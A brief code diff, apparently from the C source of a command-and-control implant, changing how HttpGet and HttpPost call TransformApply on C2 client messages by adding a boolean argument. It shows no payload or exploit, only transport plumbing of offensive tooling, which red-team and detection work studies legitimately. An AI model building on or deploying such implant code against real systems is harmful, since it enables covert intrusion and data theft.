@@ -138,7 +138,7 @@ BOOL HttpGet(PPackage package, PBYTE* ppOutData, SIZE_T* pOutLen)
 
 	TransformInit(&transform, MAXGET);
 
-	TransformApply(&transform, package->buffer, package->length, S_C2_GET_CLIENT);
+	TransformApply(&transform, package->buffer, package->length, S_C2_GET_CLIENT, FALSE);
 
 	// Add any URI parameters (e.g., /test?value=1&other=2)
 	if (strlen(transform.uriParams))
@@ -291,7 +291,7 @@ BOOL HttpPost(PPackage package, PBYTE* ppOutData, SIZE_T* pOutLen)
 
 	TransformInit(&transform, MAXGET);
 
-	TransformApply(&transform, package->buffer, package->length, S_C2_POST_CLIENT);
+	TransformApply(&transform, package->buffer, package->length, S_C2_POST_CLIENT, TRUE);
 
 
 	if (strlen(transform.uriParams))
